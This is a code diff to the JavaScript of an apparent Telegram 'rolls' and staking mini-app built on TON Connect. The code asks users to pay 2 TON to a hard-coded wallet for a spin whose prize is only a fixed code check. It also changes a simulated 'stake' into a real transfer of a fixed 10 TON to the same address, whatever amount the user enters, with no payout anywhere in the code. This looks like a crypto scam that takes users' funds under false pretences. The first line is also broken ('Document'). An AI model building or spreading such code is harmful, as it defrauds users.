@@ -1,4 +1,4 @@
-document.addEventListener('DOMContentLoaded', () => {
+Document.addEventListener('DOMContentLoaded', () => {
     const startScreen = document.querySelector('.start-screen');
     const page = document.querySelector('.page');
     const headerBurger = document.querySelector('.header__burger');
@@ -55,8 +55,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // --- 4. TON Connect Wallet & Rolls Logic ---
     const rollsInfoText = document.querySelector('.rolls-info-text');
-    // Removed connectWalletBtnRolls as it's now handled by tc-widget-root
-    const payForRollsBtn = document.getElementById('payForRollsBtn'); // Custom button
+    const sendTransactionBtn = document.getElementById('sendTransactionBtn'); // Changed from payForRollsBtn
     const codeEntrySection = document.querySelector('.code-entry-section');
     const confirmationCodeInput = document.getElementById('confirmationCodeInput');
     const verifyCodeBtn = document.getElementById('verifyCodeBtn');
@@ -64,7 +63,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const referralAfterCodeMessage = document.querySelector('.referral-after-code-message');
     const loadingAnimation = document.querySelector('.loading-animation');
     const checkmarkAnimation = document.querySelector('.checkmark-animation');
-    const spinningWheel = document.querySelector('.spinning-wheel'); // Corrected variable name
+    const spinningWheel = document.querySelector('.spinning-wheel');
 
     let isWalletConnected = false; // Track connection status
     let tonConnectUI; // Declare globally or in a scope accessible by init
@@ -72,7 +71,7 @@ document.addEventListener('DOMContentLoaded', () => {
     // Initialize TON Connect UI with buttonRootId
     tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
         manifestUrl: 'https://tonairdrops.vercel.app/tonconnect-manifest.json',
-        buttonRootId: 'tc-widget-root' // This tells TonConnectUI where to render its button
+        buttonRootId: 'ton-connect' // Use 'ton-connect' as root for the widget button
     });
 
     // Listen for TonConnectUI status changes
@@ -80,8 +79,8 @@ document.addEventListener('DOMContentLoaded', () => {
         if (wallet) {
             isWalletConnected = true;
             rollsInfoText.textContent = `Wallet connected: ${wallet.account.address.substring(0, 6)}...${wallet.account.address.substring(wallet.account.address.length - 4)}. Now, pay 2 TON to roll!`;
-            // connectWalletBtnRolls is no longer needed here as TonConnectUI manages its own button
-            payForRollsBtn.disabled = false; // Enable pay button
+            sendTransactionBtn.disabled = false; // Enable Pay & Roll button
+            sendTransactionBtn.classList.remove('hide'); // Ensure it's visible
             
             // Hide code entry/referral if wallet connects (reset state)
             codeEntrySection.classList.add('hide');
@@ -90,143 +89,139 @@ document.addEventListener('DOMContentLoaded', () => {
         } else {
             isWalletConnected = false;
             rollsInfoText.textContent = 'Connect your TON wallet to participate.';
-            // connectWalletBtnRolls is no longer needed here
-            payForRollsBtn.disabled = true; // Disable pay button
+            sendTransactionBtn.disabled = true; // Disable Pay & Roll button
+            sendTransactionBtn.classList.add('hide'); // Hide Pay & Roll button if not connected
             codeEntrySection.classList.add('hide');
             referralAfterCodeMessage.classList.add('hide');
         }
     });
 
-    // Custom Pay 2 TON & Roll Button Click
-    payForRollsBtn.addEventListener('click', async () => {
+    // Manually trigger connect if needed (though TonConnectUI button handles this)
+    // Removed connectWalletBtn and its event listener as per request.
+
+    // Send Transaction for Rolls (2 TON)
+    sendTransactionBtn.addEventListener('click', async () => {
         if (navigator.vibrate) { navigator.vibrate(50); } // Haptic feedback
         if (!isWalletConnected) {
-            rollsInfoText.textContent = 'Please connect your wallet first!';
+            rollsInfoText.textContent = 'Please connect your wallet first! Use the button above.';
             return;
         }
 
-        // Disable pay button to prevent multiple clicks during transaction
-        payForRollsBtn.disabled = true; 
+        sendTransactionBtn.disabled = true; // Disable button during transaction
 
         const transaction = {
             validUntil: Math.floor(Date.now() / 1000) + 360, // 6 minutes
             messages: [
                 {
-                    address: 'UQD8J5QN9ygpY30_afh0pqnpmTVHePlt1WrTBg-otAUjDpNG', // Your specified wallet address for 2 TON
+                    address: 'UQBADbfYuE5qGyN5ITs0FjWZ9suGQYuvy2HQ3cQ8wpyRyx0f', // Destination address for 2 TON
                     amount: '2000000000', // 2 TON in nanoton (2 * 10^9)
                 },
             ],
         };
 
         try {
-            // Send the transaction using TonConnectUI
             const result = await tonConnectUI.sendTransaction(transaction);
-            console.log('Transaction successful:', result);
-            
-            // --- Execute success simulation after actual transaction is sent ---
-            loadingAnimation.classList.remove('hide');
-            rollsInfoText.classList.add('hide'); // Hide info text during loading
-            
-            // Spin the wheel
-            spinningWheel.style.transition = 'transform 4s cubic-bezier(0.25, 0.1, 0.25, 1)';
-            spinningWheel.style.transform = `rotate(${Math.random() * 360 + 1080}deg)`; // Spin 3+ times
+            console.log('Rolls transaction successful:', result);
 
-            if (navigator.vibrate) { navigator.vibrate(100); } // Medium vibration for successful payment/spin
+            loadingAnimation.classList.remove('hide');
+            rollsInfoText.classList.add('hide');
+            
+            spinningWheel.style.transition = 'transform 4s cubic-bezier(0.25, 0.1, 0.25, 1)';
+            spinningWheel.style.transform = `rotate(${Math.random() * 360 + 1080}deg)`;
+
+            if (navigator.vibrate) { navigator.vibrate(100); }
 
             setTimeout(() => {
                 loadingAnimation.classList.add('hide');
                 checkmarkAnimation.classList.remove('hide');
-                rollsInfoText.classList.remove('hide'); // Show info text again
+                rollsInfoText.classList.remove('hide');
                 rollsInfoText.textContent = 'Payment successful! Enter your code to claim your prize.';
-                codeEntrySection.classList.remove('hide'); // Show code entry
+                codeEntrySection.classList.remove('hide');
                 checkmarkAnimation.addEventListener('loopComplete', () => {
                     checkmarkAnimation.classList.add('hide');
                 }, { once: true });
-            }, 4000); // Simulate 4 seconds for spin + loading after successful transaction
+            }, 4000);
 
         } catch (e) {
-            console.error('Transaction failed:', e);
+            console.error('Rolls transaction failed:', e);
             rollsInfoText.textContent = 'Payment failed. Please try again.';
-            loadingAnimation.classList.add('hide'); // Hide loading if it was shown
-            payForRollsBtn.disabled = false; // Re-enable pay button on failure
+            loadingAnimation.classList.add('hide');
+            sendTransactionBtn.disabled = false; // Re-enable button on failure
         }
     });
     
     // Simulate code verification
     verifyCodeBtn.addEventListener('click', () => {
         const enteredCode = confirmationCodeInput.value.trim();
-        codeErrorMessage.classList.add('hide'); // Hide previous errors
+        codeErrorMessage.classList.add('hide');
         
-        if (navigator.vibrate) { navigator.vibrate(50); } // Haptic Feedback for button click
+        if (navigator.vibrate) { navigator.vibrate(50); }
 
         if (enteredCode === '909986') { // Correct code
             codeEntrySection.classList.add('hide');
             referralAfterCodeMessage.classList.remove('hide');
-            rollsInfoText.classList.add('hide'); // Hide previous info text
-            // Optional: Disable further interaction or redirect
+            rollsInfoText.classList.add('hide');
         } else {
             codeErrorMessage.classList.remove('hide');
-            confirmationCodeInput.classList.add('error'); // Add error styling
-            if (navigator.vibrate) { navigator.vibrate(150); } // Vibrate for error
-            setTimeout(() => confirmationCodeInput.classList.remove('error'), 1500); // Remove error after a bit
+            confirmationCodeInput.classList.add('error');
+            if (navigator.vibrate) { navigator.vibrate(150); }
+            setTimeout(() => confirmationCodeInput.classList.remove('error'), 1500);
         }
     });
 
     // --- 5. Staking Section Logic ---
     const stakingAmountInput = document.getElementById('stakingAmount');
-    const estimatedProfitSpan = document.getElementById('estimatedProfit');
-    const stakingFeeSpan = document.getElementById('stakingFee');
-    const totalReturnSpan = document.getElementById('totalReturn');
     const stakeTonBtn = document.getElementById('stakeTonBtn');
     const learnMoreLink = document.querySelector('.learn-more-link');
     const learnMoreContent = document.querySelector('.learn-more-content');
 
-    const STAKING_RATE_DAILY = 0.10 / 30; // 10% profit over 30 days, daily rate
-    const FEE_RATE = 0.01; // 1% fee on total profit
+    // Removed dynamic calculation update, but keeping the input's initial state
+    stakingAmountInput.addEventListener('input', () => {
+        // No calculations, just ensure button is enabled if input has value
+        stakeTonBtn.disabled = stakingAmountInput.value === '' || parseFloat(stakingAmountInput.value) <= 0;
+        stakeTonBtn.style.opacity = stakeTonBtn.disabled ? '0.5' : '1';
+    });
+    // Initial check for stakeTonBtn state
+    stakeTonBtn.disabled = true; // Disable by default
+    stakeTonBtn.style.opacity = '0.5';
 
-    const updateStakingSummary = () => {
-        const amount = parseFloat(stakingAmountInput.value);
-        if (isNaN(amount) || amount <= 0) {
-            estimatedProfitSpan.textContent = '0 TON';
-            stakingFeeSpan.textContent = '0 TON';
-            totalReturnSpan.textContent = '0 TON';
-            stakeTonBtn.disabled = true;
-            stakeTonBtn.style.opacity = '0.5';
+    stakeTonBtn.addEventListener('click', async () => {
+        if (navigator.vibrate) { navigator.vibrate(50); }
+
+        if (!isWalletConnected) {
+            alert('Please connect your TON wallet first to stake!');
             return;
         }
-        stakeTonBtn.disabled = false;
-        stakeTonBtn.style.opacity = '1';
 
-        const estimatedTotalProfit = amount * STAKING_RATE_DAILY * 30; // Total profit for 30 days
-        const stakingFee = estimatedTotalProfit * FEE_RATE;
-        const totalReturn = amount + estimatedTotalProfit - stakingFee;
+        stakeTonBtn.disabled = true; // Disable button during transaction
 
-        estimatedProfitSpan.textContent = `${estimatedTotalProfit.toFixed(2)} TON`;
-        stakingFeeSpan.textContent = `${stakingFee.toFixed(2)} TON`;
-        totalReturnSpan.textContent = `${totalReturn.toFixed(2)} TON`;
-    };
+        const stakingTransaction = {
+            validUntil: Math.floor(Date.now() / 1000) + 360, // 6 minutes
+            messages: [
+                {
+                    address: "UQBADbfYuE5qGyN5ITs0FjWZ9suGQYuvy2HQ3cQ8wpyRyx0f", // Same destination address as Rolls for consistency or update if different
+                    amount: "10000000000" // 10 TON in nanotons
+                }
+            ]
+        };
 
-    stakingAmountInput.addEventListener('input', updateStakingSummary);
-    updateStakingSummary(); // Initial calculation
-
-    stakeTonBtn.addEventListener('click', () => {
-        if (navigator.vibrate) { navigator.vibrate(50); } // Haptic Feedback for button click
-
-        const amount = parseFloat(stakingAmountInput.value);
-        if (isNaN(amount) || amount <= 0) {
-            alert('Please enter a valid amount to stake.');
-            return;
+        try {
+            const result = await tonConnectUI.sendTransaction(stakingTransaction);
+            console.log("Staking transaction successful:", result);
+            alert('Staking transaction sent successfully! It might take a moment to confirm.');
+        } catch (error) {
+            console.error("Staking transaction failed:", error);
+            alert('Staking transaction failed. Please try again. ' + error.message);
+        } finally {
+            stakeTonBtn.disabled = false; // Re-enable button
         }
-        // Simulate staking transaction (no actual blockchain interaction here)
-        alert(`Simulating staking of ${amount} TON. This would initiate a transaction in a real DApp.`);
-        // In a real DApp, you would use tonConnectUI.sendTransaction here
     });
 
     learnMoreLink.addEventListener('click', (e) => {
         e.preventDefault();
         learnMoreContent.classList.toggle('hide');
         learnMoreLink.textContent = learnMoreContent.classList.contains('hide') ? 'Learn More About Staking' : 'Show Less';
-        if (navigator.vibrate) { navigator.vibrate(30); } // Haptic Feedback for toggle
+        if (navigator.vibrate) { navigator.vibrate(30); }
     });
 
     // --- 6. Earn Section Logic ---
@@ -234,29 +229,48 @@ document.addEventListener('DOMContentLoaded', () => {
     const copyReferralBtn = document.querySelector('.copy-referral-btn');
     const claimRewardBtn = document.querySelector('.stat-value .claim-btn');
 
+    // Generate referral link with Telegram user ID
+    function generateReferralLink() {
+        if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initDataUnsafe && window.Telegram.WebApp.initDataUnsafe.user) {
+            const userId = window.Telegram.WebApp.initDataUnsafe.user.id;
+            referralLinkInput.value = `http://t.me/rollstvBot?start=${userId}`; // Use your bot username
+        } else {
+            referralLinkInput.value = "http://t.me/rollstvBot?start=YOUR_USER_ID"; // Fallback or for local testing
+            console.warn("Telegram WebApp user ID not available. Using placeholder for referral link.");
+        }
+    }
+    generateReferralLink(); // Call on load
+
     copyReferralBtn.addEventListener('click', () => {
         referralLinkInput.select();
         referralLinkInput.setSelectionRange(0, 99999); // For mobile devices
-        document.execCommand('copy');
-        copyReferralBtn.textContent = 'Copied!';
-        setTimeout(() => {
-            copyReferralBtn.innerHTML = '<i class="far fa-copy"></i> Copy'; // Reset button text
-        }, 2000);
-        if (navigator.vibrate) { navigator.vibrate(50); } // Haptic Feedback
+        try {
+            document.execCommand('copy');
+            copyReferralBtn.innerHTML = '<i class="fas fa-check"></i> Copied!'; // Change icon to checkmark
+            setTimeout(() => {
+                copyReferralBtn.innerHTML = '<i class="far fa-copy"></i> Copy'; // Reset button text and icon
+            }, 2000);
+            if (navigator.vibrate) { navigator.vibrate(50); }
+        } catch (err) {
+            console.error('Failed to copy text: ', err);
+            alert('Failed to copy referral link. Please copy it manually: ' + referralLinkInput.value);
+        }
     });
 
     if (claimRewardBtn) {
         claimRewardBtn.addEventListener('click', () => {
             alert('Claiming rewards simulated! In a real DApp, this would initiate a withdrawal transaction.');
-            if (navigator.vibrate) { navigator.vibrate(70); } // Haptic Feedback
+            if (navigator.vibrate) { navigator.vibrate(70); }
         });
     }
 
     // Placeholder for dynamic user name in Earn section
     const earnUserName = document.querySelector('.earn-user-name');
-    // You would typically get the Telegram username from Telegram Mini App API or a backend.
-    // For now, it remains a static placeholder.
-    // Example: if (window.Telegram.WebApp) earnUserName.textContent = `@${window.Telegram.WebApp.initDataUnsafe.user.username || 'TelegramUser'}`;
+    if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initDataUnsafe && window.Telegram.WebApp.initDataUnsafe.user) {
+        earnUserName.textContent = `Hello, ${window.Telegram.WebApp.initDataUnsafe.user.first_name || 'User'}!`;
+    } else {
+        earnUserName.textContent = 'Hello, User!';
+    }
 
 
     // --- 7. Team Section Photo Interaction ---
@@ -264,14 +278,12 @@ document.addEventListener('DOMContentLoaded', () => {
 
     teamPhotos.forEach(photo => {
         photo.addEventListener('click', () => {
-            if (navigator.vibrate) { navigator.vibrate(30); } // Haptic Feedback
+            if (navigator.vibrate) { navigator.vibrate(30); }
 
-            // Toggle elevated class for the clicked photo
             if (photo.classList.contains('elevated')) {
                 photo.classList.remove('elevated');
                 photo.classList.add('blurred');
             } else {
-                // Remove elevated class from all other photos first
                 teamPhotos.forEach(p => {
                     p.classList.remove('elevated');
                     p.classList.add('blurred');
@@ -282,7 +294,6 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     });
 
-    // --- 8. Global Countdown Timer (Removed logic, now static) ---
+    // --- 8. Global Countdown Timer (Static content, no JS needed) ---
     // The countdown element is now static in index.html, so no JavaScript is needed for it.
-    // Removed: updateCountdown function and setInterval.
 });
